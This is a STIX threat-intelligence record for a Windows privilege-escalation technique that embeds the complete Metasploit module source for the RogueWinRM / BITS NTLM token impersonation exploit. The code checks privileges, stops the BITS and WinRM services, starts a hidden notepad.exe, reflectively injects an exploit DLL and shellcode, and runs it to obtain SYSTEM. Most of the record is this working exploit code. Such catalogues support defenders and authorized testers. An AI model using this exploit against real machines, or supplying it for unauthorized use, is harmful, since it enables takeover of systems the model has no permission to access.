{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c0910f74-5432-49b5-842b-19e4dea71747",
    "created": "2024-08-14T16:50:07.213092Z",
    "modified": "2024-08-14T16:50:07.213096Z",
    "name": "SYSTEM token impersonation through NTLM bits authentication on missing WinRM Service.",
    "description": " This module exploit BITS behavior which tries to connect to the local Windows Remote Management server (WinRM) every times it starts. The module launches a fake WinRM server which listen on port 5985 and triggers BITS. When BITS starts, it tries to authenticate to the Rogue WinRM server, which allows to steal a SYSTEM token. This token is then used to launch a new process as SYSTEM user. In the case of this exploit, notepad.exe is launched as SYSTEM. Then, it write shellcode in its previous memory space and trigger its execution. As this exploit uses reflective dll injection, it does not write any file on the disk. See /documentation/modules/exploit/windows/local/bits_ntlm_token_impersonation.md for complementary words of information.  Vulnerable operating systems are Windows 10 and Windows servers where WinRM is not running. Lab experiments has shown that Windows 7 does not exhibit the vulnerable behavior.  WARNING:  - As this exploit runs a service on the target (Fake WinRM on port 5985), a firewall popup may appear on target screen. Thus, this exploit may not be completely silent.  - This exploit has been successfully tested on : Windows 10 (10.0 Build 19041) 32 bits Windows 10 Pro, Version 1903 (10.0 Build 18362) 64 bits  - This exploit failed because of no BITS authentication attempt on: Windows 7 (6.1 Build 7601, Service Pack 1) 32 bits  - Windows servers are not vulnerable because a genuine WinRM service is already running, except if the user has disabled it (Or if this exploit succeed to terminate it).  - SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privs are required.  - BITS must not be running.  - This exploit automatically perform above quoted checks. run \"check\" command to run checklist.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bits_ntlm_token_impersonation.rb",
            "external_id": "bits_ntlm_token_impersonation.rb"
        },
        {
            "source_name": "reference",
            "url": "https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/antonioCoco/RogueWinRM"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core/post/windows/reflective_dll_injection'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  # Those are integer codes for representing the services involved in this exploit.\n  BITS = 1\n  WINRM = 2\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'SYSTEM token impersonation through NTLM bits authentication on missing WinRM Service.',\n          'Description' => %q{\n            This module exploit BITS behavior which tries to connect to the\n            local Windows Remote Management server (WinRM) every times it\n            starts. The module launches a fake WinRM server which listen on\n            port 5985 and triggers BITS. When BITS starts, it tries to\n            authenticate to the Rogue WinRM server, which allows to steal a\n            SYSTEM token. This token is then used to launch a new process\n            as SYSTEM user. In the case of this exploit, notepad.exe is launched\n            as SYSTEM. Then, it write shellcode in its previous memory space\n            and trigger its execution. As this exploit uses reflective dll\n            injection, it does not write any file on the disk. See\n            /documentation/modules/exploit/windows/local/bits_ntlm_token_impersonation.md\n            for complementary words of information.\n\n            Vulnerable operating systems are Windows 10 and Windows servers where WinRM is not running.\n            Lab experiments has shown that Windows 7 does not exhibit the vulnerable behavior.\n\n            WARNING:\n\n            - As this exploit runs a service on the target (Fake WinRM on port\n            5985), a firewall popup may appear on target screen. Thus, this exploit\n            may not be completely silent.\n\n            - This exploit has been successfully tested on :\n            Windows 10 (10.0 Build 19041) 32 bits\n            Windows 10 Pro, Version 1903 (10.0 Build 18362) 64 bits\n\n            - This exploit failed because of no BITS authentication attempt on:\n            Windows 7 (6.1 Build 7601, Service Pack 1) 32 bits\n\n            - Windows servers are not vulnerable because a genuine WinRM\n            service is already running, except if the user has disabled it\n            (Or if this exploit succeed to terminate it).\n\n            - SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privs are\n            required.\n\n            - BITS must not be running.\n\n            - This exploit automatically perform above quoted checks.\n            run \"check\" command to run checklist.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Cassandre', # Adapted decoder's POC for metasploit\n            'Andrea Pierini (decoder)', # Lonely / Juicy Potato. Has written the POC\n            'Antonio Cocomazzi (splinter_code)',\n            'Roberto (0xea31)',\n          ],\n          'Arch' => [ARCH_X86, ARCH_X64],\n          'Platform' => 'win',\n          'SessionTypes' => ['meterpreter'],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'none',\n            'WfsDelay' => '120'\n          },\n          'Targets' => [\n            ['Automatic', {}]\n          ],\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'SideEffects' => [SCREEN_EFFECTS],\n            'Reliability' => [REPEATABLE_SESSION]\n          },\n          'Payload' => {\n            'DisableNops' => true,\n            'BadChars' => \"\\x00\"\n          },\n          'References' => [\n            ['URL', 'https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/'],\n            ['URL', 'https://github.com/antonioCoco/RogueWinRM'],\n          ],\n          'DisclosureDate' => '2019-12-06',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_sys_config_getenv\n                stdapi_sys_config_getprivs\n                stdapi_sys_config_sysinfo\n                stdapi_sys_process_attach\n                stdapi_sys_process_execute\n                stdapi_sys_process_thread_create\n              ]\n            }\n          }\n        }\n      )\n    )\n\n    shutdown_service_option_description = [\n      'Should this module attempt to shutdown BITS and WinRM services if they are running?',\n      'Setting this parameter to true is useful only if SESSION is part of administrator group.',\n      'In the common usecase (running as LOCAL SERVICE) you don\\'t have enough privileges.'\n    ].join(' ')\n\n    winrm_port_option_description = [\n      'Port the exploit will listen on for BITS connexion.',\n      'As the principle of the exploit is to impersonate a genuine WinRM service,',\n      'it should listen on WinRM port. This is in most case 5985 but in some configuration,',\n      'it may be 47001.'\n    ].join(' ')\n\n    host_process_option_description = [\n      'The process which will be launched as SYSTEM and execute metasploit shellcode.',\n      'This process is launched without graphical interface so it is hidden.'\n    ].join(' ')\n\n    register_options(\n      [\n        OptBool.new('SHUTDOWN_SERVICES', [true, shutdown_service_option_description, false]),\n        OptPort.new('WINRM_RPORT', [true, winrm_port_option_description, 5985]),\n        OptString.new('HOST_PROCESS', [true, host_process_option_description, 'notepad.exe'])\n      ]\n    )\n  end\n\n  #\n  # Function used to perform all mandatory checks in order to assess\n  # if the target is vulnerable before running the exploit.\n  # Basically, this function does the following:\n  #   - Checks if current session has either SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege\n  #   - Checks if operating system is neither Windows 7 nor Windows XP\n  #   - Checks if BITS and WinRM are running, and attempt to terminate them if the user\n  #     has specified the corresponding option\n  #   - Checks if the session is not already SYSTEM\n  def check\n    privs = client.sys.config.getprivs\n    version = get_version_info\n    # Fast fails\n    if version.build_number < Msf::WindowsVersion::Win8 && !version.windows_server?\n      print_bad(\"Operating system: #{version.product_name}\")\n      print_bad('BITS behavior on Windows 7 and previous has not been shown vulnerable.')\n      return Exploit::CheckCode::Safe\n    end\n\n    unless privs.include?('SeImpersonatePrivilege') || privs.include?('SeAssignPrimaryTokenPrivilege')\n      print_bad('Target session is missing both SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege.')\n      return Exploit::CheckCode::Safe\n    end\n    vprint_good('Target session has either SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.')\n\n    running_services_code = check_bits_and_winrm\n    if running_services_code < 0\n      return Exploit::CheckCode::Safe\n    end\n\n    should_services_be_shutdown = datastore['SHUTDOWN_SERVICES']\n    if running_services_code > 0\n      if should_services_be_shutdown\n        shutdown_service(running_services_code)\n        sleep(2)\n        running_services_code = check_bits_and_winrm\n      end\n      if [WINRM, WINRM + BITS].include?(running_services_code)\n        print_bad('WinRM is running. Target is not exploitable.')\n        return Exploit::CheckCode::Safe\n      elsif running_services_code == BITS\n        if should_services_be_shutdown\n          print_warning('Failed to shutdown BITS.')\n        end\n        print_warning('BITS is running. Don\\'t panic, the exploit should handle this, but you have to wait for BITS to terminate.')\n      end\n    end\n\n    if is_system?\n      print_bad('Session is already elevated.')\n      return Exploit::CheckCode::Safe\n    end\n\n    vprint_good('Session is not (yet) System.')\n    Exploit::CheckCode::Appears\n  end\n\n  #\n  # This function is dedicated in checking if bits and WinRM are running.\n  # It returns the running services. If both services are down, it returns 0.\n  # If BITS is running, it returns 1 (Because BITS class constant = 1). If\n  # WinRM is running, it returns 2. And if both are running, it returns\n  # BITS + WINRM = 3.\n  def check_bits_and_winrm\n    result = cmd_exec('cmd.exe', '/c echo . | powershell.exe Get-Service -Name BITS,WinRM')\n    vprint_status('Checking if BITS and WinRM are stopped...')\n\n    if result.include?('~~')\n      print_bad('Failed to retrieve infos about WinRM and BITS. Access is denied.')\n      return -1\n    end\n\n    if result.include?('Stopped  BITS') && result.include?('Stopped  WinRM')\n      print_good('BITS and WinRM are stopped.')\n      return 0\n    end\n\n    if result.include?('Running  BITS') && result.include?('Stopped  WinRM')\n      print_warning('BITS is currently running. It must be down for the exploit to succeed.')\n      return BITS\n    end\n\n    if result.include?('Stopped  BITS') && result.include?('Running  WinRM')\n      print_warning('WinRM is currently running. It must be down for the exploit to succeed.')\n      return WINRM\n    end\n\n    if result.include?('Running  BITS') && result.include?('Running  WinRM')\n      print_warning('BITS and WinRM are currently running. They must be down for the exploit to succeed.')\n      return BITS + WINRM\n    end\n  end\n\n  #\n  # Attempt to shutdown services through powershell.\n  def shutdown_service(service_code)\n    stop_command_map = {\n      BITS => 'powershell.exe Stop-Service -Name BITS',\n      WINRM => 'powershell.exe Stop-Service -Name WinRM',\n      BITS + WINRM => 'powershell.exe Stop-Service -Name BITS,WinRM'\n    }\n    print_status('Attempting to shutdown service(s)...')\n    cmd_exec(stop_command_map[service_code])\n  end\n\n  def exploit\n    payload_name = datastore['PAYLOAD']\n    payload_arch = framework.payloads.create(payload_name).arch\n    winrm_port = datastore['WINRM_RPORT']\n    host_process_name = datastore['HOST_PROCESS']\n\n    if payload_arch.first == ARCH_X64\n      dll_file_name = 'drunkpotato.x64.dll'\n      vprint_status('Assigning payload drunkpotato.x64.dll')\n    elsif payload_arch.first == ARCH_X86\n      dll_file_name = 'drunkpotato.x86.dll'\n      vprint_status('Assigning payload drunkpotato.x86.dll')\n    else\n      fail_with(Failure::BadConfig, 'Unknown target arch; unable to assign exploit code')\n    end\n    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'drunkpotato', dll_file_name)\n    library_path = ::File.expand_path(library_path)\n\n    print_status('Launching notepad to host the exploit...')\n    notepad_path = get_notepad_pathname(\n      payload_arch.first,\n      client.sys.config.getenv('windir'),\n      client.arch\n    )\n    notepad_process = client.sys.process.execute(notepad_path, nil, { 'Hidden' => true })\n    begin\n      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)\n      print_good(\"Process #{process.pid} launched.\")\n    rescue Rex::Post::Meterpreter::RequestError\n      # Reader Sandbox won't allow to create a new process:\n      # stdapi_sys_process_execute: Operation failed: Access is denied.\n      print_error('Operation failed. Trying to elevate the current process...')\n      process = client.sys.process.open\n    end\n\n    print_status(\"Injecting exploit into #{process.pid}...\")\n    exploit_mem, offset = inject_dll_into_process(process, library_path)\n\n    print_status(\"Exploit injected. Injecting payload into #{process.pid}...\")\n    formatted_payload = [\n      winrm_port.to_s,\n      host_process_name,\n      payload.encoded.length.to_s,\n      payload.encoded\n    ].join(\"\\x00\")\n    payload_mem = inject_into_process(process, formatted_payload)\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Payload injected. Executing exploit...')\n    process.thread.create(exploit_mem + offset, payload_mem)\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-12-06",
    "x_mitre_platforms": [
        "win'"
    ]
}